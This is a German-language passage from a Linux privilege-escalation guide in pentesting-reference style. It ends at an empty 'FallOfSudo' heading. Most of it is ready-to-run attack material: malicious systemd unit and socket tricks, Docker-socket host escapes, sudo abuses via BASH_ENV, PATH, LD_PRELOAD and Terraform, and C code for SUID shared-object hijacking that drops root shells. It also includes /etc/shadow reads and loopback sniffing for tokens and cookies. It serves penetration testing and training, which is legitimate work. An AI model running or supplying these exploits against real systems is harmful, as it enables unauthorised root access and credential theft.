Wenn du eine **beschreibbare** `.socket`-Datei findest, kannst du am Anfang der `[Socket]`-Sektion etwas wie `ExecStartPre=/home/kali/sys/backdoor` **hinzufügen** und die Backdoor wird ausgeführt, bevor der Socket erstellt wird. Daher musst du **wahrscheinlich warten, bis die Maschine neu gebootet wird.**\ _Hinweis: Das System muss diese Socket-Dateikonfiguration verwenden, sonst wird die Backdoor nicht ausgeführt_

### Socket-Aktivierung + beschreibbarer Unit-Pfad (fehlenden Service erstellen)

Eine weitere Fehlkonfiguration mit hohem Risiko ist:

- eine socket unit mit `Accept=no` und `Service=<name>.service`
- die referenzierte service unit fehlt
- ein Angreifer kann in `/etc/systemd/system` schreiben (oder in einen anderen Unit-Suchpfad)

In diesem Fall kann der Angreifer `<name>.service` erstellen und dann Traffic an den Socket auslösen, sodass systemd die neue Service-Unit lädt und als root ausführt.

Kurzablauf:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Schreibbare Sockets

Wenn du **ein schreibbares Socket identifizierst** (_jetzt sprechen wir über Unix Sockets und nicht über die config `.socket` Dateien_), dann **kannst du mit diesem Socket kommunizieren** und möglicherweise eine Schwachstelle ausnutzen.

### Unix Sockets auflisten
```bash
netstat -a -p --unix
```
### Rohverbindung
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Beachte, dass es möglicherweise einige **sockets listening for HTTP** Anfragen gibt (_ich spreche nicht von .socket files, sondern von Dateien, die als unix sockets fungieren_). Du kannst das damit prüfen:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Wenn der Socket **mit einer HTTP-Anfrage antwortet**, dann kannst du **mit ihm kommunizieren** und vielleicht **exploit some vulnerability**.

### Beschreibbarer Docker Socket

Der Docker-Socket, häufig zu finden unter `/var/run/docker.sock`, ist eine kritische Datei, die gesichert werden sollte. Standardmäßig ist er für den `root`-Benutzer und Mitglieder der `docker`-Gruppe schreibbar. Schreibzugriff auf dieses Socket kann zu einer Privilege Escalation führen. Hier ist eine Aufschlüsselung, wie das gemacht werden kann, und alternative Methoden, falls die Docker CLI nicht verfügbar ist.

#### **Privilege Escalation with Docker CLI**

Wenn du Schreibzugriff auf den Docker-Socket hast, kannst du escalate privileges mit den folgenden Befehlen durchführen:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Diese Befehle erlauben es, einen Container mit root-Zugriff auf das Dateisystem des Hosts auszuführen.

#### **Using Docker API Directly**

In Fällen, in denen die Docker-CLI nicht verfügbar ist, kann der docker socket weiterhin über die Docker API und `curl`-Befehle manipuliert werden.

1.  **List Docker Images:** Ruft die Liste der verfügbaren Images ab.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Sendet eine Anfrage, um einen Container zu erstellen, der das Root-Verzeichnis des Hosts einbindet.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Verwende `socat`, um eine Verbindung zum Container herzustellen und die Ausführung von Befehlen darin zu ermöglichen.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nachdem die `socat`-Verbindung aufgebaut ist, können Sie Befehle direkt im Container ausführen und haben Root-Zugriff auf das Dateisystem des Hosts.

### Others

Beachten Sie, dass Sie, wenn Sie Schreibrechte auf den docker socket haben, weil Sie **in der Gruppe `docker`** sind, [**weitere Möglichkeiten zur Privilegienerhöhung**](interesting-groups-linux-pe/index.html#docker-group) haben. Wenn die [**docker API auf einem Port lauscht** Sie können diese ebenfalls kompromittieren](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Check **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Wenn Sie feststellen, dass Sie den **`ctr`**-Befehl verwenden können, lesen Sie die folgende Seite, da **Sie ihn möglicherweise zur Privilegienerhöhung missbrauchen können**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Wenn Sie feststellen, dass Sie den **`runc`**-Befehl verwenden können, lesen Sie die folgende Seite, da **Sie ihn möglicherweise zur Privilegienerhöhung missbrauchen können**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ist ein ausgeklügeltes inter-Process Communication (IPC) system, das Anwendungen ermöglicht, effizient zu interagieren und Daten auszutauschen. Es wurde für moderne Linux-Systeme entwickelt und bietet ein robustes Framework für verschiedene Formen der Anwendungskommunikation.

Das System ist vielseitig und unterstützt grundlegendes IPC, das den Datenaustausch zwischen Prozessen verbessert, ähnlich wie **enhanced UNIX domain sockets**. Darüber hinaus hilft es beim Broadcasten von Events oder Signalen und fördert so eine nahtlose Integration zwischen Systemkomponenten. Zum Beispiel kann ein Signal eines Bluetooth-Daemons über einen eingehenden Anruf einen Musikplayer stummschalten und so die Nutzererfahrung verbessern. Zusätzlich unterstützt D-Bus ein Remote-Object-System, das Service-Anfragen und Methodenaufrufe zwischen Anwendungen vereinfacht und Prozesse, die traditionell komplex waren, vereinfacht.

D-Bus arbeitet nach einem **allow/deny model**, verwaltet Nachrichtenberechtigungen (Methodenaufrufe, Signal-Emissionen usw.) basierend auf der kumulativen Wirkung passender Policy-Regeln. Diese Richtlinien spezifizieren Interaktionen mit dem Bus und können potenziell eine Privilegienerhöhung ermöglichen, wenn diese Berechtigungen ausgenutzt werden.

Ein Beispiel für eine solche Policy in `/etc/dbus-1/system.d/wpa_supplicant.conf` wird gezeigt und beschreibt Berechtigungen für den root-Benutzer, `fi.w1.wpa_supplicant1` zu besitzen, Nachrichten an es zu senden und Nachrichten von ihm zu empfangen.

Richtlinien ohne angegebenen Benutzer oder Gruppe gelten allgemein, während "default"-Kontext-Richtlinien für alle gelten, die nicht durch andere spezifische Richtlinien abgedeckt sind.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Lerne hier, wie du eine D-Bus-Kommunikation enumerate und exploit kannst:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netzwerk**

Es ist immer interessant, das Netzwerk zu enumerate und die Position der Maschine zu ermitteln.

### Generische enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Schnelle Triage bei ausgehender Filterung

Wenn der Host Befehle ausführen kann, aber callbacks fehlschlagen, unterscheide schnell, ob DNS-, Transport-, Proxy- oder Routing-Filterung die Ursache ist:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Offene Ports

Überprüfe immer Netzwerkdienste, die auf der Maschine laufen und mit denen du vor dem Zugriff nicht interagieren konntest:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Listener nach Bind-Ziel klassifizieren:

- `0.0.0.0` / `[::]`: auf allen lokalen Schnittstellen exponiert.
- `127.0.0.1` / `::1`: nur lokal (gute tunnel/forward-Kandidaten).
- Spezifische interne IPs (z. B. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): in der Regel nur von internen Segmenten erreichbar.

### Triage-Workflow für nur lokal verfügbare Dienste

Wenn du einen Host kompromittierst, werden Dienste, die an `127.0.0.1` gebunden sind, von deiner Shell oft zum ersten Mal erreichbar. Ein schneller lokaler Workflow ist:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS als Netzwerkscanner (network-only mode)

Neben lokalen PE-Checks kann linPEAS als fokussierter Netzwerkscanner laufen. Es nutzt verfügbare Binaries im `$PATH` (typischerweise `fping`, `ping`, `nc`, `ncat`) und installiert kein tooling.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Wenn du `-d`, `-p` oder `-i` ohne `-t` übergibst, verhält sich linPEAS wie ein reiner network scanner (überspringt die restlichen privilege-escalation checks).

### Sniffing

Prüfe, ob du traffic sniffen kannst. Falls ja, könntest du damit credentials abgreifen.
```
timeout 1 tcpdump
```
Schnelle praktische Prüfungen:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) ist besonders wertvoll in der post-exploitation, weil viele nur intern erreichbare Dienste dort tokens/cookies/credentials offenlegen:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Capture jetzt, parse später:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Users

### Generic Enumeration

Überprüfe, **who** du bist, welche **privileges** du hast, welche **users** in den Systemen sind, welche sich **login** können und welche **root privileges** haben:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Einige Linux-Versionen waren von einem Bug betroffen, der es Benutzern mit **UID > INT_MAX** erlaubt, Privilegien zu eskalieren. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Ausnutzen** mit: **`systemd-run -t /bin/bash`**

### Gruppen

Prüfe, ob du Mitglied einer **Gruppe** bist, die dir root-Rechte gewähren könnte:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Zwischenablage

Prüfe, ob sich interessante Inhalte in der Zwischenablage befinden (falls möglich)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Passwortrichtlinie
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekannte Passwörter

Wenn du **ein Passwort** der Umgebung kennst, **versuche, dich mit diesem Passwort als jeden Benutzer anzumelden**.

### Su Brute

Wenn es dir nichts ausmacht, viel Lärm zu machen, und die Binaries `su` und `timeout` auf dem Rechner vorhanden sind, kannst du versuchen, Benutzer mit [su-bruteforce](https://github.com/carlospolop/su-bruteforce) brute-forcen.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) mit dem Parameter `-a` versucht ebenfalls, Benutzer per Brute-Force zu testen.

## Missbrauch schreibbarer $PATH-Verzeichnisse

### $PATH

Wenn du feststellst, dass du **in einen Ordner des $PATH schreiben kannst**, kannst du möglicherweise Privilegien eskalieren, indem du **eine backdoor in das beschreibbare Verzeichnis legst**, die den Namen eines Befehls trägt, der von einem anderen Benutzer (root ideally) ausgeführt wird, und die **nicht aus einem Verzeichnis geladen wird, das in $PATH vor deinem beschreibbaren Verzeichnis liegt

### SUDO and SUID

Es kann sein, dass du berechtigt bist, einen Befehl mit sudo auszuführen, oder dass bestimmte Binärdateien das suid-Bit gesetzt haben. Prüfe das mit:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Einige **unerwartete commands ermöglichen es, Dateien zu lesen und/oder zu schreiben oder sogar execute a command.** Zum Beispiel:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Die Sudo-Konfiguration kann einem Benutzer erlauben, einen Befehl mit den Rechten eines anderen Benutzers auszuführen, ohne dessen Passwort zu kennen.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In diesem Beispiel kann der Benutzer `demo` `vim` als `root` ausführen. Es ist nun trivial, eine shell zu erhalten, indem man einen ssh key in das root-Verzeichnis hinzufügt oder `sh` aufruft.
```
sudo vim -c '!sh'
```
### SETENV

Diese Direktive erlaubt es dem Benutzer, beim Ausführen von etwas **eine Umgebungsvariable zu setzen**:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Dieses Beispiel, **basierend auf der HTB-Maschine Admirer**, war **anfällig** für **PYTHONPATH hijacking**, wodurch beim Ausführen des Skripts als root eine beliebige python-Bibliothek geladen werden konnte:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV beibehalten durch sudo env_keep → root shell

Wenn sudoers `BASH_ENV` beibehält (z. B. `Defaults env_keep+="ENV BASH_ENV"`), kannst du Bashs nicht-interaktives Startverhalten ausnutzen, um beliebigen Code als root auszuführen, wenn du einen erlaubten Befehl aufrufst.

- Why it works: Für nicht-interaktive Shells wertet Bash `$BASH_ENV` aus und bindet diese Datei ein, bevor das Zielskript ausgeführt wird. Viele sudo-Regeln erlauben das Ausführen eines Skripts oder eines Shell-Wrappers. Wenn `BASH_ENV` von sudo beibehalten wird, wird deine Datei mit root-Rechten eingebunden.

- Voraussetzungen:
- Eine sudo-Regel, die du ausführen kannst (jedes Ziel, das `/bin/bash` nicht-interaktiv aufruft, oder jedes bash-Skript).
- `BASH_ENV` in `env_keep` vorhanden (prüfe mit `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Härtung:
- Entferne `BASH_ENV` (und `ENV`) aus `env_keep`; bevorzuge `env_reset`.
- Vermeide Shell-Wrapper für sudo-erlaubte Befehle; verwende minimale Binärdateien.
- Ziehe sudo I/O-Protokollierung und Benachrichtigungen in Betracht, wenn erhaltene Umgebungsvariablen verwendet werden.

### Terraform via sudo with preserved HOME (!env_reset)

Wenn sudo die Umgebung intakt lässt (`!env_reset`) und gleichzeitig `terraform apply` erlaubt, bleibt `$HOME` beim aufrufenden Benutzer. Terraform lädt deshalb **$HOME/.terraformrc** als root und beachtet `provider_installation.dev_overrides`.

- Zeige den benötigten Provider auf ein beschreibbares Verzeichnis und lege ein bösartiges Plugin mit dem Namen des Providers ab (z. B. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform schlägt beim Go plugin handshake fehl, führt die payload jedoch noch vor dem Absturz als root aus und hinterlässt dabei eine SUID shell.

### TF_VAR overrides + symlink validation bypass

Terraform-Variablen können über Umgebungsvariablen wie `TF_VAR_<name>` bereitgestellt werden, die erhalten bleiben, wenn sudo die Umgebung bewahrt. Schwache Validierungen wie `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` lassen sich mit symlinks umgehen:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform löst den symlink auf und kopiert die echte `/root/root.txt` in einen für einen Angreifer lesbaren Zielort. Der gleiche Ansatz lässt sich verwenden, um in privilegierte Pfade zu **schreiben**, indem man Ziel-Symlinks vorab anlegt (z. B. indem man den Zielpfad des Providers innerhalb von `/etc/cron.d/` zeigt).

### requiretty / !requiretty

Bei einigen älteren Distributionen kann sudo mit `requiretty` konfiguriert werden, was sudo dazu zwingt, nur von einem interaktiven TTY aus ausgeführt zu werden. Wenn `!requiretty` gesetzt ist (oder die Option fehlt), kann sudo aus nicht-interaktiven Kontexten wie reverse shells, cron jobs oder Skripten ausgeführt werden.
```bash
Defaults !requiretty
```
Dies ist an sich keine direkte Schwachstelle, erweitert jedoch die Situationen, in denen sudo-Regeln ohne ein vollständiges PTY missbraucht werden können.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Wenn `sudo -l` `env_keep+=PATH` anzeigt oder eine `secure_path` enthält, die von einem Angreifer beschreibbare Einträge hat (z. B. `/home/<user>/bin`), kann jeder relative Befehl innerhalb des sudo-erlaubten Ziels überschrieben werden.

- Voraussetzungen: eine sudo-Regel (oft `NOPASSWD`), die ein Skript oder eine Binärdatei ausführt, das Befehle ohne absolute Pfade aufruft (`free`, `df`, `ps`, etc.) und ein beschreibbarer PATH-Eintrag, der zuerst durchsucht wird.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo-Ausführung: Pfade umgehen
**Springe**, um andere Dateien zu lesen oder verwende **symlinks**. Zum Beispiel in sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Wenn ein **wildcard** verwendet wird (\*), ist es noch einfacher:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Gegenmaßnahmen**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary ohne Befehls-Pfad

Wenn die **sudo permission** für einen einzelnen Befehl **ohne Angabe des Pfads** vergeben ist: _hacker10 ALL= (root) less_ , kann man dies ausnutzen, indem man die PATH-Variable ändert
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Diese Technik kann auch verwendet werden, wenn ein **suid** binary **einen anderen Befehl ausführt, ohne den Pfad dazu anzugeben (prüfe immer mit** _**strings**_ **den Inhalt eines seltsamen SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary mit Befehls-Pfad

Wenn das **suid** binary **einen anderen Befehl ausführt und dabei den Pfad angibt**, dann kannst du versuchen, eine Funktion mit dem Namen des vom suid file aufgerufenen Befehls zu erstellen und diese zu **export a function**.

Zum Beispiel, wenn ein suid binary _**/usr/sbin/service apache2 start**_ aufruft, musst du versuchen, die Funktion zu erstellen und sie zu exportieren:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Wenn du die suid binary aufrufst, wird diese Funktion ausgeführt

### Schreibbares script, das von einem SUID wrapper ausgeführt wird

Eine häufige custom-app-Fehlkonfiguration ist ein root-owned SUID binary wrapper, der ein script ausführt, während das script selbst von low-priv users schreibbar ist.

Typisches Muster:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Wenn `/usr/local/bin/backup.sh` beschreibbar ist, können Sie payload-Befehle anhängen und dann den SUID-Wrapper ausführen:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Schnelle Überprüfungen:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Dieser Angriffsvektor tritt besonders häufig in "Wartungs"/"Backup"-Wrappern auf, die in `/usr/local/bin` ausgeliefert werden.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die Umgebungsvariable **LD_PRELOAD** wird verwendet, um eine oder mehrere shared libraries (.so-Dateien) anzugeben, die vom Loader vor allen anderen, einschließlich der standardmäßigen C-Bibliothek (`libc.so`), geladen werden. Dieser Vorgang wird als Preloading einer Bibliothek bezeichnet.

Um jedoch die Systemsicherheit zu gewährleisten und zu verhindern, dass diese Funktion ausgenutzt wird – insbesondere bei **suid/sgid**-Executables – erzwingt das System bestimmte Bedingungen:

- Der Loader ignoriert **LD_PRELOAD** für ausführbare Dateien, bei denen die reale Benutzer-ID (_ruid_) nicht mit der effektiven Benutzer-ID (_euid_) übereinstimmt.
- Bei Executables mit suid/sgid werden nur Bibliotheken in Standardpfaden vorgeladen, die ebenfalls suid/sgid sind.

Privilege escalation kann auftreten, wenn Sie in der Lage sind, Befehle mit `sudo` auszuführen und die Ausgabe von `sudo -l` die Anweisung **env_keep+=LD_PRELOAD** enthält. Diese Konfiguration erlaubt es, dass die Umgebungsvariable **LD_PRELOAD** erhalten bleibt und auch bei Ausführung von Befehlen mit `sudo` berücksichtigt wird, was möglicherweise zur Ausführung von beliebigem Code mit erhöhten Rechten führen kann.
```
Defaults        env_keep += LD_PRELOAD
```
Speichere als **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dann **kompiliere es** mit:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Schließlich **escalate privileges** ausführen
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Ein ähnlicher privesc kann ausgenutzt werden, wenn der Angreifer die **LD_LIBRARY_PATH**-Umgebungsvariable kontrolliert, weil er den Pfad kontrolliert, in dem Bibliotheken gesucht werden.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wenn man auf ein Binary mit **SUID**-Berechtigungen stößt, das ungewöhnlich erscheint, ist es gute Praxis zu prüfen, ob es **.so**-Dateien korrekt lädt. Das lässt sich überprüfen, indem man den folgenden Befehl ausführt:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Zum Beispiel deutet das Auftreten eines Fehlers wie _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ auf ein mögliches Exploitation-Potenzial hin.

Um dies zu exploit, erstellt man eine C-Datei, z. B. _"/path/to/.config/libcalc.c"_, die folgenden Code enthält:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Dieser Code zielt nach dem Kompilieren und Ausführen darauf ab, privileges zu erhöhen, indem er Dateiberechtigungen manipuliert und eine shell mit elevated privileges ausführt.

Kompiliere die obige C-Datei in eine shared object (.so)-Datei mit:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Schließlich sollte das Ausführen des betroffenen SUID binary den exploit auslösen und so eine mögliche Kompromittierung des Systems ermöglichen.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Da wir nun ein SUID binary gefunden haben, das eine Bibliothek aus einem Ordner lädt, in den wir schreiben können, erstellen wir die Bibliothek in diesem Ordner mit dem notwendigen Namen:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Wenn Sie einen Fehler wie diesen erhalten:
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
Das bedeutet, dass die Bibliothek, die du erzeugt hast, eine Funktion namens `a_function_name` enthalten muss.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ist eine kuratierte Liste von Unix-Binaries, die von einem Angreifer ausgenutzt werden können, um lokale Sicherheitsbeschränkungen zu umgehen. [**GTFOArgs**](https://gtfoargs.github.io/) ist dasselbe, aber für Fälle, in denen du in einen Befehl **nur Argumente injizieren** kannst.

Das Projekt sammelt legitime Funktionen von Unix-Binaries, die missbraucht werden können, um aus eingeschränkten Shells auszubrechen, Privilegien zu eskalieren oder aufrechtzuerhalten, Dateien zu übertragen, bind and reverse shells zu starten und andere Post-Exploitation-Aufgaben zu erleichtern.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

